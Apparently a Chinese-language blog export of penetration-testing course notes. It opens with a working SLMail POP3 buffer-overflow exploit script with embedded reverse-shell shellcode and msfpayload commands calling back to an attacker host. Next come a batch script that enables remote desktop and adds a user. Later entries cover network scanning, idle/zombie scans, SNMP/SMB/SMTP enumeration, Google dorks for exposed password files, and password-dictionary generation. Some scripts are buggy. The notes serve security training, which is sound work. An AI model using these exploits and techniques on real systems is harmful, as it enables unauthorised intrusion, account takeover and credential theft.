("\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46\xbd\x2a"+"\x29\x83\xeb\xfc\xe2\xf4\xba\xd7\xc1\x64\xae\x44\xd5\xd6\xb9\xdd"+"\xa1\x45\x62\x99\xa1\x6c\x7a\x36\x56\x2c\x3e\xbc\xc5\xa2\x09\xa5"+"\xa1\x76\x66\xbc\xc1\x60\xcd\x89\xa1\x28\xa8\x8c\xea\xb0\xea\x39"+"\xea\x5d\x41\x7c\xe0\x24\x47\x7f\xc1\xdd\x7d\xe9\x0e\x01\x33\x58"+"\xa1\x76\x62\xbc\xc1\x4f\xcd\xb1\x61\xa2\x19\xa1\x2b\xc2\x45\x91"+"\xa1\xa0\x2a\x99\x36\x48\x85\x8c\xf1\x4d\xcd\xfe\x1a\xa2\x06\xb1"+"\xa1\x59\x5a\x10\xa1\x69\x4e\xe3\x42\xa7\x08\xb3\xc6\x79\xb9\x6b"+"\x4c\x7a\x20\xd5\x19\x1b\x2e\xca\x59\x1b\x19\xe9\xd5\xf9\x2e\x76"+"\xc7\xd5\x7d\xed\xd5\xff\x19\x34\xcf\x4f\xc7\x50\x22\x2b\x13\xd7"+"\x28\xd6\x96\xd5\xf3\x20\xb3\x10\x7d\xd6\x90\xee\x79\x7a\x15\xfe"+"\x79\x6a\x15\x42\xfa\x41\x4c\xb7\x20\xa9\x20\xd5\x2b\x95\x20\xee"+"\xa3\xc8\xd3\xd5\xc6\xd0\xec\xdd\x7d\xd6\x90\xd7\x3a\x78\x13\x42"+"\xfa\x4f\x2c\xd9\x4c\x41\x25\xd0\x40\x79\x1f\x94\xe6\xa0\xa1\xd7"+"\x6e\xa0\xa4\x8c\xea\xda\xec\x28\xa3\xd4\xb8\xff\x07\xd7\x04\x91"+"\xa7\x53\x7e\x16\x81\x82\x2e\xcf\xd4\x9a\x50\x42\x5f\x01\xb9\x6b"+"\x71\x7e\x14\xec\x7b\x78\x2c\xbc\x7b\x78\x13\xec\xd5\xf9\x2e\x10"+"\xf3\x2c\x88\xee\xd5\xff\x2c\x42\xd5\x1e\xb9\x6d\x42\xce\x3f\x7b"+"\x53\xd6\x33\xb9\xd5\xff\xb9\xca\xd6\xd6\x96\xd5\xda\xa3\x42\xe2"+"\x79\xd6\x90\x42\xfa\x29")buffer = "A"*2606 + "\xe3\x41\x4b\x5f" + "\x90"*8 + shellcodetry: print "\nSending evil buffer..." s.connect(('192.169.10.128',110)) date = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS '+ buffer + '\r\n') s.close() print "\nDone!."except: print "Could not connect to POP3!" 90 表示汇编语言不操作 保护shellcode nc -vlp 444 侦听444端口 shellcode执行结束后以ExitProcess 方式退出整个进程，将导致邮件服务崩溃 Slmail是一个基于线程的应用，适用ExitThread方式可以避免整个服务崩溃，可实现重复溢出 ./msfpayload win32_reverse LHOST=192.168.20.8 EXITFUNC=thread LPORT=443 R| ./msfencode -b “\x00\x0a\x0d” 10.py 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/pythonimport sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM)shellcode = ("\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46\xbd\x2a"+"\x29\x83\xeb\xfc\xe2\xf4\xba\xd7\xc1\x64\xae\x44\xd5\xd6\xb9\xdd"+"\xa1\x45\x62\x99\xa1\x6c\x7a\x36\x56\x2c\x3e\xbc\xc5\xa2\x09\xa5"+"\xa1\x76\x66\xbc\xc1\x60\xcd\x89\xa1\x28\xa8\x8c\xea\xb0\xea\x39"+"\xea\x5d\x41\x7c\xe0\x24\x47\x7f\xc1\xdd\x7d\xe9\x0e\x01\x33\x58"+"\xa1\x76\x62\xbc\xc1\x4f\xcd\xb1\x61\xa2\x19\xa1\x2b\xc2\x45\x91"+"\xa1\xa0\x2a\x99\x36\x48\x85\x8c\xf1\x4d\xcd\xfe\x1a\xa2\x06\xb1"+"\xa1\x59\x5a\x10\xa1\x69\x4e\xe3\x42\xa7\x08\xb3\xc6\x79\xb9\x6b"+"\x4c\x7a\x20\xd5\x19\x1b\x2e\xca\x59\x1b\x19\xe9\xd5\xf9\x2e\x76"+"\xc7\xd5\x7d\xed\xd5\xff\x19\x34\xcf\x4f\xc7\x50\x22\x2b\x13\xd7"+"\x28\xd6\x96\xd5\xf3\x20\xb3\x10\x7d\xd6\x90\xee\x79\x7a\x15\xfe"+"\x79\x6a\x15\x42\xfa\x41\x4c\xb7\x20\xa9\x20\xd5\x2b\x95\x20\xee"+"\xa3\xc8\xd3\xd5\xc6\xd0\xec\xdd\x7d\xd6\x90\xd7\x3a\x78\x13\x42"+"\xfa\x4f\x2c\xd9\x4c\x41\x25\xd0\x40\x79\x1f\x94\xe6\xa0\xa1\xd7"+"\x6e\xa0\xa4\x8c\xea\xda\xec\x28\xa3\xd4\xb8\xff\x07\xd7\x04\x91"+"\xa7\x53\x7e\x16\x81\x82\x2e\xcf\xd4\x9a\x50\x42\x5f\x01\xb9\x6b"+"\x71\x7e\x14\xec\x7b\x78\x2c\xbc\x7b\x78\x13\xec\xd5\xf9\x2e\x10"+"\xf3\x2c\x88\xee\xd5\xff\x2c\x42\xd5\x1e\xb9\x6d\x42\xce\x3f\x7b"+"\x53\xd6\x33\xb9\xd5\xff\xb9\xca\xd6\xd6\x96\xd5\xda\xa3\x42\xe2"+"\x79\xd6\x90\x42\xfa\x29")buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*8 + shellcode#buffer = "A"*2606 + "\xe3\x41\x4b\x5f" + "\x90"*8 + shellcodetry: print "\nSending evil buffer..." s.connect(('192.169.10.128',110)) date = s.recv(1024) s.send('USER test' + '\r\n') data = s.recv(1024) s.send('PASS '+ buffer + '\r\n') s.close() print "\nDone!."except: print "Could not connect to POP3!" 1234567891011echo Windows Registry Editor Version 5.00&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer]&gt;&gt;3389.regecho &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.regecho &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.regecho [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp]&gt;&gt;3389.regecho &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.regregedit /s 3389.reg apt-get install rdesktop rdesktop 192.168.10.128 net user hello password regsnap 注册表快照]]></content>
  </entry>
  <entry>
    <title><![CDATA[主动信息收集]]></title>
    <url>%2F2018%2F03%2F04%2F%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[主动信息收集主动信息收集 直接与目标系统交互通信 无法避免留下访问的痕迹 使用受控的第三方电脑进行探测 使用代理或已被控制的主机 做好被封杀的准备 使用噪音迷惑目标，淹没真实的探测流量 扫描 发送不同的探测，根据返回结果判断目标状态 发现 识别活着的主机 潜在的被攻击目标 输出一个IP地址列表 2、3、4层发现 二层发现 优点：扫描速度快、可靠 缺点：不可路由 Arp协议 抓包 arping arping 1.1.1.1 -c 1 -c 包数量 arping -c 1 1.1.1.1 | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1 脚本 12345678910111213#! /bin/bashif ["$#" -ne 1]; then echo "usage - ./arping.sh [interface]" echo "Example - ./arping.sh eth0" echo "Example will perform an ARP scan of the local subnet to which eth0 is assigned" exitfiinterface=$1prefix=$(ifconfig $interface | grep 'inet addr' | cut -d ':' -f 2| cut -d ' ' -f 1 | cut -d '.' -f 1-3)for addr in $(seq 1 254);do arping -c 1 $prefix.$addr |grep "bytes from"| cut -d "" -f 5 | cut -d "(" -f 2 | cut -d ")" -f 1done 1234567891011#!/bin/bashif [ "$#" -ne 1]; then echo "Usage - ./arping.sh [interface]" echo "Example - ./arping.sh eth0" echo "Example will perform an ARP scan of the local subnet to which eth0 is assigned" exitfifile = $1for addr in $(cat $file); do arping -c 1 $addr | grep "bytes from" | cut -d " " -f 5 | cut -d "(" -f 2| cut -d ")" -f 1done nmap 1.1.1.1-254 -sn nmap -iL iplist.txt -sn 不是单纯ARP 还有DNS 可以抓包分析 Netdiscover 专用于二层发现 可用于无线和交换网络环境 主动和被动探测 主动 netdiscover -i eth0 -r 1.1.1.0/24 netdiscover -i iplist.txt 被动 netdiscover -p 主动arp容易触发报警 Scapy 可以作为Python库进行调用 也可以作为单独的工具使用 抓包、分析、创建、修改、注入网络流量 apt-get install python-gunplot Scapy ARP().display() Src1() py扫描脚本 123456789101112131415161718192021222324#! /usr/bin/pythonimport loggingimport subprocesslogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!=2: print("Usage - ./arp_disc.py [interface]") print("Example - ./arp_disc.py eth0") print("Example will perform an ARP scan of the local subnet to which eth0 is assigned") sys.exit() interface = str(sys.argv[1])ip = subprocess.check_output("ifconfig" + interface + "| grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1",shell=True ).strip()prefix = ip.split('.')[0]+'.'+ip.split('.')[1]+'.'+ip.split('.')[2]+'.'for addr in range(0,254): answer = sr1(ARP(pdst=prefix+str(addr)),timeout=0.1,verbose=0) if answer == None: pass else: print(prefix+str(addr)) 1234567891011121314151617181920212223#! /usr/bin/pythonimport loggingimport subprocesslogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!=2: print("Usage - ./arp_disc.py [interface]") print("Example - ./arp_disc.py eth0") print("Example will perform an ARP scan of the local subnet to which eth0 is assigned") sys.exit() filename = str(sys.argv[1])file = open(filename,'r')for addr in file: answer = srl(ARP(pdst=addr.strip()), timeout=0.1,verbose=1) if answer == None: pass else: print addr.strip() ​ 三层发现 优点 可路由 速度比较快 缺点 速度比二层慢 经常被边界防火墙过滤 IP、ICMP协议 ping 1.1.1.1 -c 2 ping -R 1.1.1.1 / traceroute 1.1.1.1 `ping 1.1.1.1 -c 1 | grep “bytes from” | cut -d “ “ -f 4 | cut -d “:” -f 1 脚本 1234567891011#!/bin/bashif["$#" -ne 1];then echo "Usage - ./pinger.sh [/24 network address]" echo "Example - ./ping.sh 172.16.26.0" echo "Example will perform an ICMP ping sweep of the 172.16.26.0/24 work" exitfiprefix=$(echo $1 | cut -d '.' -f 1-3)for addr in $(seq 1 254);do ping -c|1 $prefix.$addr|grep "bytes from"| cut -d ""-f 4|cut -d "." -f 1 &amp;done ​ 四层发现 优点 可路由且结果可靠 不太可能被防火墙过滤 甚至可以发现所有端口都被过滤的主机 缺点 基于状态过滤的防火墙可能过滤扫描 全端口扫描速度慢 TCP 未经请求的ACK——RST SYN——SYN/ACK、RST UDP ICMP端口不可达、一去不复返 ACK——TCP Port——RST Scapy 12345678910i = IP()t = TCP()r = (i/t)r.display()r[IP].dst="192.168.1.1"r[TCP].flags="A"a=sr1(r)a.display()a = sr1(IP(dst="1.1.1.1")/TCP(dport=80,flags='A'), timeout=1) ACK_Ping.py 1234567891011121314151617181920import logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!=2: print("Usage - ./ACK_Ping.py [/24 network address]") print("Example - ./ACK_Ping.py 1.1.1.0") print("Example will perform a TCP ACK ping scan of the 1.1.1.0/24 range") sys.exit() address = srt(sys.argv[1])prefix = address.split('.')[0] + '.'+address.split('.')[1]+'.'+address.split('.')[2]+'.'for addr in range(1,254): respone=sr1(IP(dst=prefix+str(addr))/TCP(dport=2222,flag='A'),timeout=0.1,verbose=0) try: if int(response[TCP].flags)==4: print(prefix+str(addr)) except: pass ​ 基于UDP UDP——UDP Port——ICMP 12345u = UDP()u.dport=33333r = (i/u)a = sr1(r,timeout=1,verbose=1)a.display() UDP_Ping.py 1234567891011121314151617181920import logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *if len(sys.argv)!=2: print("Usage - ./ACK_Ping.py [/24 network address]") print("Example - ./ACK_Ping.py 1.1.1.0") print("Example will perform a TCP ACK ping scan of the 1.1.1.0/24 range") sys.exit() address = srt(sys.argv[1])prefix = address.split('.')[0] + '.'+address.split('.')[1]+'.'+address.split('.')[2]+'.'for addr in range(1,254): respone=sr1(IP(dst=prefix+str(addr))/UDP(dport=22222),timeout=0.1,verbose=0) try: if int(response[IP].proto)==1: print(prefix+str(addr)) except: pass ​ nmap四层发现 nmap 1.1.1.1-254 -PU53 -sn UDP方式 nmap 1.1.1.1-254 -PA80 -sn ACK方式 nmap -iL iplist.txt -PA80 -sn hping3 hping3 --udp 211.144.145.1 -c 1 udp_hping.sh 12345678910111213#! /bin/bashif ["$#" -ne 1]; then echo "Usage - ./udp_hping.sh [/24 network address]" echo "Example - ./udp_hping.sh 172.16.36.0" echo "Example will perform a UDP ping sweep of the 172.16.36.0/24 network and output to an output.txt file" exitfiprefix=$(echo $1 | cut -d '.' -f 1-3)for addr in $(seq 1 254); do hping3 $prefix.$addr --udp -c 1 &gt;&gt;r.txtdonegrep Unreachable r.txt | cut -d " " -f 5 | cut -d "=" -f 2 &gt;&gt; output.txtrm r.txt hping3 1.1.1.1 -c 1 （TCP) tcp_hping.sh 12345678910111213#! /bin/bashif ["$#" -ne 1]; then echo "Usage - ./tcp_hping.sh [/24 network address]" echo "Example - ./tcp_hping.sh 172.16.36.0" echo "Example will perform a TCP ping sweep of the 172.16.36.0/24 network and output to an output.txt file" exitfiprefix=$(echo $1 | cut -d '.' -f 1-3)for addr in $(seq 1 254); do hping3 $prefix.$addr -c 1 &gt;&gt;r.txtdonegrep len r.txt | cut -d " " -f 5 | cut -d "=" -f 2 &gt;&gt; output.txtrm r.txt Flag 0 —- ACK,RST 端口扫描 端口对应网络服务及应用端程序 服务端程序的漏洞通过端口攻入 发现开放的端口 更具体的攻击面 UDP 端口扫描 假设 ICMP port-unreachable 响应代表端口关闭 目标系统不响应ICMP port-unreachable时，可能产生误判 完整的UPD应用层请求 准确性高 耗时巨大 Scapy UDP Scan 端口关闭：ICMP port-unreachable 端口开放：没有回包 了解每一种基于UDP的应用层结构很有帮助 与三层相同的技术 误判 Scapy sr1(IP(dst=&quot;1.1.1.1&quot;)/UDP(dport=53), timeout=1,verbose=1) ./udp_scan.py 1.1.1.1 1 100 123456789101112131415161718192021222324#! /usr/bin/pythonimport logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *import timeimport sysif len(sys.argv)!=4: print("Usage - ./udp_scan.py [Target-IP] [First Port] [Last Port]") print("Example - ./udp_scan.py 10.0.0.5 1 100") print("Example will UDP port scan ports 1 through 100 on 10.0.0.5") sys.exit() ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start,end): a = sr1(IP(dst=ip)/UDP(dport=port),timeout=5,verbose=0) time.sleep(1) if a==None: print(port) else: pass Nmap nmap -sU 1.1.1.1 默认的1000个参数 ICMP host-unreachable nmap 1.1.1.1 -sU -p 53 nmap -iL iplist.txt -sU -p 1-200 TCP端口扫描 基于连接的协议 三次握手 隐蔽扫描 僵尸扫描 全连接扫描（完成三次握手） 所有的TCP扫描方式都是基于三次握手的变化来判断目标端口状态（1-SYN 2-SYN，ACK 3-ACK） 隐蔽扫描——syn 不建立完整连接 应用日志不记录扫描行为——隐蔽 僵尸扫描 极度隐蔽 实施条件苛刻 （1.发起方伪造IP地址 2.有僵尸机 3.IPID递增产生 可伪造源地址 选择僵尸机 闲置系统 系统使用递增的IPID 0 随机 隐蔽端口扫描 Syn——syn/ack——rst Scapy sr1(IP(dst=&quot;192.168.60.3&quot;)/TCP(dport=80),timeout=1,verbose=1) a = sr1(IP(dst=&quot;192.168.1.134&quot;)/TCP(flags=&quot;S&quot;,dport=22), timeout=1, verbose=0) ./syn_scan.py chmod u+x syn_scan.py 12345678910111213141516171819202122232425#! /usr/bin/pythonimport logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *import sysif len(sys.argv)!=4: print("Usage - ./syn_scan.py [Target-IP] [First Port] [Last Port]") print("Example - ./syn_scan.py 10.0.0.5 1 100") print("Example will TCP SYN scan ports 1 through 100 on 10.0.0.5") sys.exit() ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start,end): a = sr1(IP(dst=ip)/TCP(dport=port),timeout=1,verbose=0) if a == None: pass else: if int(a[TCP],flags) == 18: print(port) else: pass nmap -sS 1.1.1.1 -p 80,21,25,110,43 nmap -sS 1.1.1.1 -p 1-65535 -open nmap -sS 1.1.1.1 -p- --open nmap -sS -iL iplist.txt -p 80 hping3 hping3 1.1.1.1 --scan 80 -S hping3 1.1.1.1 --scan 80,21,25,443 -S hping3 1.1.1.1 --scan 0-65535 -S hping3 -c 10 -S --spoof 1.1.1.2 -p ++1 1.1.1.3 伪造IP地址 伪造源地址去查看 或控制交换机镜像端口 全连接端口扫描 Scapy Syn扫描不需要raw packets 内核认为syn/ack是非法包，直接发rst中断连接 全连接扫描对scapy比较困难 sr1(IP(dst=&quot;192.168.20.2&quot;)/TCP(dport=22,flags=&#39;S&#39;)) ./tcp_scan1.py 1234567#! /usr/bin/pythonimport logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *response = sr1(IP(dst="192.168.60.4")/TCP(dport=80,flags='S'))reply = sr1(IP(dst="192.168.60.4")/TCP(dport=80,flags='A',ack=(response[TCP].seq+1))) ./tcp_scan2.py 1234567891011121314151617181920212223#!/usr/bin/pythonimport logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *syn = IP(dst="192.168.20.4")/TCP(dport=4444,flags='S')print("--SENT--")SYN.display()print("\n\n--RECEIVED--")response=sr1(SYN,timeout=1,verbose=0)response.display()if int(response[TCP].flags)==18: print("\n\n--SENT--") A = IP(dst="192.168.20.4")/TCP(dport=4444,flags='A',ack=(response[TCP].seq+1)) A.display() print("\n\n--RECEIVED") response2=sr1(A,timeout=1,verbose=0) response2.display()else: print("SYN-ACK not returned") ​ iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.20.2 -j DROP 禁用内核RST nmap nmap -sT 192.168.1.134 -p 1-100 nmap -sT 1.1.1.1 -p 80,21,25 nmap -sT 1.1.1.1 -p 80-2000 nmap -sT -iL iplist.txt -p 80 默认1000个常用端口 dmirty 功能简单，但使用简便 默认150个最常用的端口 dmitry -p 172.16.36.135 dmitry -p 172.16.36.135 -o output nc nc -nv -w 1 -z 192.168.1.134 1-100 僵尸扫描 Scapy——zombie.py 1234567891011121314151617181920i = IP()t = TCP()rz=(i/t)rt=(i/t)rz[IP].dst="192.168.1.133"rz[TCP].dport=445rz[TCP].flags="SA"rt[IP].src="192.168.1.133"rt[IP].dst="192.168.1.134"rt[TCP].dport=25rt[TCP].flags="S"az1=sr1(rz)at=sr1(rt,timeout=1)az2=sr1(rz)az1.display()az2.display()ip id+2 目标端口开放ip id+1 目标端口关闭 123456789101112131415161718192021222324252627282930313233343536373839404142import logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import *def ipid(zombie): reply1=sr1(IP(dst=zombie)/TCP(flags="SA"),timeout=2,verbose=0) send(IP(dst=zombie)/TCP(flags="SA"),verbose=0) reply2=sr1(IP(dst=zombie)/TCP(flags="SA"),timeout=2,verbose=0) if reply2[IP].id==(reply1[IP].id+2): print("IPID sequence is incremental and target appears to be idle. ZOMBIE LOCATED") resoponse=input("Do you want to use this zombie to perform a scan?(Y or N)") if response = "Y": target=input("Enter the IP address of the target system") zombiescan=(target,zombie) else: print("Either the IPID sequence is not incremental or the target is not idle,NOT A GOOD ZOMBIE") def zombiescan(target,zombie): print("\nScanning target" + target + "with zombie" + zombie) print("\n----------Open Ports on Target----------\n") for port in range(1,100): try: start_val=sr1(IP(dst=zombie)/TCP(flags="SA",dport=port),timeout=2,verbose=0) send(IP(src=zombie,dst=target)/TCP(flags="S",dport=port),verbose=0) end_val=sr1(IP(dst=zombie)/TCP(flags="SA"),timeout=2,verbose=0) if end_val[IP].id==(start_val[IP].id+2): print(port) except: pass print("----------Zombie Scan Suite----------\n")print("1 - Identify Zombie Host\n")print("2 - Perform Zombie Scan\n")ans = input("Select an Option (1 or 2):")if ans=="1": zombie=input("Enter IP address to test IPID sequence:") ipid(zombie)else: if ans == "2": zombie=input("Enter IP address for zombie system: ") target=input("Enter IP address for scan target: ") zombiescan(target,zombie) 发现僵尸机 nmap -p445 192.168.1.133 --script=ipidseq.nse 扫描目标 nmap 172.16.36.135 -sI 172.16.136.134 -Pn -p 0-100 服务扫描 识别开放端口上运行的应用 识别目标操作系统 提高攻击效率 Banner捕获 服务识别 操作系统识别 SNMP分析 防火墙识别 Banner 软件开发商 软件名称 服务类型 版本号 直接发现已知的漏洞和弱点 连接建立后直接获取banner 另类服务识别方法 特征行为和响应字段 不同的响应可用于识别底层操作系统 SNMP 简单网络管理协议 Community strings 信息查询或重新配置 识别和绕过防火墙筛选 Banner nc -nv 192.168.1.134 22 Python socket Socket模块用于连接网络服务 1234567import socketbanner=socket.socket(socket.AF_INET,socket.SOCK_STREAM)banner.connect(("192.168.1.134",21))banner.recv(4096)# `220(vsFTPD 2.3.4)\r\n`banner.close()exit() Banner不允许抓取，recv函数无返回将挂起 1234567891011121314151617181920212223import socketimport selectimport sysif len(sys.argv)!=4: print("Usage - ./banner_grab.py [Target-IP] [First Port] [Last Port]") print("Example - ./banner_grab.py 10.0.0.5 1 100") print("Example will grab banners for TCP ports 1 through 100 on 10.0.0.5") ip = sys.argv[1]start = int(sys.argv[2])end = int(sys.argv[3])for port in range(start, end): try: bangrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM) bangrab.connect((ip,port)) ready=select.select([bangrab],[],[],1) if ready[0]: print("TCP Port" + str(port) + "-" + bangrab.recv(4096)) bangrab.close() except: pass dmitry -p 172.16.36.135 dmitry -pb 172.16.36.135 nmap -sT 1.1.1.1 -p 1-100 --script=banner.nse amap -B 172.16.36.35 21 amap -B 172.16.36.135 1-65535 amap -B 172.16.36.135 1-65535 | grep on 服务扫描——服务识别 Banner信息抓取能力有限 nmap响应特征分析识别服务 发送系列复杂的探测 依据响应特征signature nc -nv 1.1.1.1 80 nmap 1.1.1.1 -p 80 -sV Amap amap 192.168.1.134 80 amap 172.16.36.135 20-30 amap 172.16.36.135 20-30 -q amap 172.16.36.135 20-30 -qb 操作系统识别 操作系统识别技术 种类繁多 好产品采用多种技术组合 TTL起始值 Windows:128(65-128) Linux/Unix:64(1-64) 某些Unix:255 Python 1234567891011121314151617181920from scapy.all import*import logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)import sysif len(sys.argv)!=2: print("Usage - ./ttl_os.py [IP Address]") print("Example - ./ttl_os.py 10.0.0.5") print("Example will perform ttl analysis to attempt to determine whether the system is Windows or Linux/Unix") sys.exit() ip = sys.argv[1]ans=sr1(IP(dst=str(ip))/ICMP(),timeout=1,verbose=0)if ans==None: print("No response was returned")elif int(ans[IP].ttl)&lt;=64: print("Host is Linux/Unix")else: print("Host is Windows") nmap nmap -O 192.168.1.133 xprobe2 192.168.1.134 被动操作系统识别 IDS 抓包分析 被动扫描 P0f 结合ARP地址欺骗识别全网OS SNMP扫描 snmp 信息的金矿 经常被错误配置 public/private/manager MIB Tree SNMP Management Information Base （MIB） 树形的网络设备管理功能数据库 1.3.6.1.4.1.77.1.2.25 onesixtyone 1.1.1.1 public onesixtyone -c dict.txt -i hosts -o my.log -w 100 snmapwalk 192.168.1.133 -c public -v 2c snmapwalk -c public -v 2c 192.168.1.133 1.3.6.1.4.1.77.1.2.25 snmpcheck -t 192.168.1.153 snmpcheck -t 192.168.1.153 -c private -v 2 snmpcheck -t 192.168.20.199 -w SMB扫描nmap -v -p139,445 192.168.60.1-20 nmap 192.168.60.4 -p139,445 --script=smb-os-discovery.nse nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1 nbtscan -r 192.168.60.0/24 enum4linux -a 192.168.60.10 Server Message Block 协议 微软历史上出现安全问题最多的协议 实现复杂 默认开放 文件共享 空会话未身份认证访问（SMB1） 密码策略 用户名 组名 机器名 用户名 SMTP扫描nc -nc 1.1.1.1 25 nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum=users.methods={VRFY} nmap smtp.163.com -p25 --script=smtp-open-relay.nse smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1 ./smtp.py 123456789101112131415import socketimport sysif len(sys.argv)!=2: print("Usage:smtp.py &lt;username&gt;") sys.exit(0) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect=s.connect(('192.168.20.5'，25))banner=s.recv(1024)print(banner+'aaaaaaaaaa')s.send('VRFY' + sys.argv[1]+ '\r\n')result=s.recv(1024)print(result)s.close 防火墙识别1234567891011121314151617181920212223242526import sysimport logginglogging.getLogger("scapy.runtime").setLevel(logging.ERROR)from scapy.all import*if len(sys.argv)!=3: print("Usage - ./FW_detect.py [Target-IP] [Target Port]") print("Example - /FW_detect.py 10.0.0.5 443") print("Example will determine if filtering exists on port 443 of host 10.0.0.5") sys.exit() ip = sys.argv[1]port = int(sys.argv[2])ACK_response = sr1(IP(dst=ip)/TCP(dport=port,flags='A'),timeout=1,verbose=0)SYN_response = sr1(IP(dst=ip)/TCP(dport=port,flags='S'),timeout=1,verbose=0)if (ACK_response = None ) and (SYN_response == None): print("Port is either unstatefully filtered or host is down")elif((ACK_response == None) or (SYN_response == None)) and not ((ACK_response==None) and (SYN_response == None)): print("Stateful filtering in place")elif int(SYN_response[TCP].flags) == 18: print("Port is unfiltered and open")elif int(SYN_response[TCP].flags) == 20: print("Port is unfiltered and closed")else: print("Unable to determine if the port is filtered") Nmap有系列防火墙过滤检测功能 nmap -sA 172.16.36.135 -p 22 负载均衡识别 广域网负载均衡 DNS HTTP-Loadbalancing Nginx Apache lbd www.baidu.com lbd mail.163.com WAF识别 web应用防火墙 wafw00f -l wafw00f http://www.microsoft.com nmap www.microsoft.com --script=http-waf-detect.nse NMAP 所有参数 zenmap]]></content>
  </entry>
  <entry>
    <title><![CDATA[被动信息收集]]></title>
    <url>%2F2018%2F02%2F05%2F%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[第六章 被动信息收集被动信息收集 公开渠道可获得的信息 与目标系统不产生直接交互 尽量避免留下一切痕迹 OSINT： 美国军方：http://www.fas.org/irp/doddir/army/atp2-22-9.pdf 北大西洋公约组织：http://information-retrieval.info/docs/NATO-OSINT.html 信息收集内容 IP地址段 域名信息 邮件地址 文档图片数据 公司地址 公司组织架构 联系电话/传真号码 人员姓名/职务 目标系统使用的技术架构 公开的商业信息 信息用途 用信息描述目标 发现 社会工程学攻击 物理缺口 信息收集——DNS 域名解析成IP地址 域名与FQDN的区别 域名记录：A(主机记录)、C name（别名记录）、NS（域名服务器记录）、MX（邮件服务器记录）、PTR（反向记录） 递归查询与迭代查询 ​ DNS——nslookup域名服务器地址 本地缓存服务器 逐级将CNAME解析为A记录主机再解析为IP地址 123456789nslookupwww.sina.comnslookupset type=mxsina.comserver 8.8.8.8 换DNSset type=any 查询任何记录nslookup -type=ns example.com 156.154.70.22 SPF记录 DNS——DIG dig @8.8.8.8 www.sina.com mx dig ww.sina.com any dig +noall +answer mail.163.com any 反向查询：dig +noall +answer -x 8.8.8.8 -x bind版本信息：dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com DNS追踪：dig +trace example.com DNS区域传输 dig @ns1.example.com example.com axfr host -T -l sina.com 8.8.8.8 DNS字典爆破 fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt usr/share/fierce/hosts.txt dnsdict6 -d4 -t 16 -x sina.com dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml dpkg -L dnseum find / -name dnseum dnsmap sina.com -w dns.txt dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt dnsrecon -t std -d sina.com DNS注册信息 Whois whois -h whois.apnic.net 192.0.43.1 搜索引擎 公司新闻动态 重要雇员信息 机密文档、网络拓扑 用户名密码* 目标系统软硬件技术架构 SHODAN 搜索联网的设备 Banner: http、ftp、ssh、telnet https://www.shodan.io/ 常见:filter: net(192.168.20.1) city country port(80\21\22\23) os Hostname(主机或域名) server country:CN city:beijing port:22 GOOGLE搜索 +充值 -支付 北京的电⼦子商务公司——北京 intitle:电⼦子商务 intext:法⼈人 intext:电话 阿里网站上的北京公司联系⼈人——北京 site:alibaba.com inurl:contact 塞班司法案的PDF⽂文档——SOX filetype:pdf 法国的⽀支付相关⻚页⾯面——payment site:fr GOOGLE搜索——实例 inurl:”level/15/exec/-/show” intitle:”netbotz appliance” “ok” inurl /admin/login.php inurl:qq.txt filetype:xls “username | password“ inurl:ftp “password” filetype:xls site:baidu.com Service.pwd http://exploit-db.com/google-dorks YANDEX世界第四⼤大搜索引擎——俄罗斯https://www.yandex.com/ 用户信息 邮件 theharvester -d sina.com -l 300 -b google 文件 metagoofil -d microsoft.com -t pdf -l 200 -o test -f 1.html MELTAGO其他途径 社交网络 工商注册 新闻组 论坛 招聘网站 htttp://www.archive.org/web/web.php 生成密码字典 按个人信息生成其专属的密码字典 CUPP —— Common User Password Profiler git clone https://github.com/Mebus/cupp.git python cup.py -i METADATA EXIF Foca RECON-NG web信息搜索框架 命令格式与msf一致 基于Python开发 使用方法： 模块 数据库 报告 全局选项 